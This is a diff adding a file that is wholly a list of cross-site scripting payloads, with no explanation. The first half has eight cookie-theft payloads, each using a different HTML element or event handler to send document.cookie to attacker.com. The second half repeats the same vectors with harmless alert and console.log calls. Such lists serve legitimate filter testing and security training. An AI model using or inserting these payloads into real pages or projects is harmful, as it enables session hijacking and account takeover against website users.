@@ -1,0 +1,25 @@
+<script>
+    fetch('http://attacker.com/steal?cookie=' + document.cookie);
+</script>
+<svg/onload=fetch('http://attacker.com/log?data='+document.cookie)>
+<iframe src="javascript:eval('fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)')"></iframe>
+<img src="x" onerror="window.location='http://attacker.com?cookie=' + document.cookie;">
+<body onload="document.write('<img src=\'http://attacker.com/steal?cookie=' + document.cookie + '\'>')">
+<details open ontoggle="fetch('http://attacker.com/log?data=' + document.cookie)">
+<input autofocus onfocus="eval('fetch(\'http://attacker.com/log?cookie=\' + document.cookie)')">
+<marquee onstart="window.location='http://attacker.com/xss?data=' + document.cookie">XSS Payload</marquee>
+
+
+<script>
+    var script = document.createElement('script');
+    script.innerHTML = 'alert("XSS Executed via Dynamic Script Injection")';
+    document.body.appendChild(script);
+</script>
+
+<svg/onload="window.alert('XSS through SVG');">
+<iframe src="javascript:alert('XSS via Iframe')"></iframe>
+<img src="x" onerror="alert('XSS through Image Error Handling')">
+<body onload="console.log('XSS triggered on body load')">
+<details open ontoggle="console.log('XSS triggered in details toggle')">
+<input autofocus onfocus="alert('XSS in Input Focus')">
+<marquee onstart="alert('XSS through Marquee')">XSS Example</marquee>
